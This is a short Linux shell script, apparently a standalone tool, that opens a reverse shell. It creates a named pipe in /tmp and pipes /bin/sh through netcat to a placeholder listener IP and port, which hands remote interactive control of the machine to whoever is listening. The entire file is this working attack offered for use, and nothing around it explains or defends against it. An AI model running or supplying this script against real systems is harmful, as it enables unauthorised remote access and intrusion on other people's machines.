#!/bin/sh
# This is a Linux shell script to reverse bash shell to a specific listenning IP and port. 

a=$(date +%s);
backpipe="backpipe""$a";

mknod /tmp/$backpipe p;
/bin/sh 0</tmp/$backpipe | nc [Listen IP] [Listen Port] 1>/tmp/$backpipe;

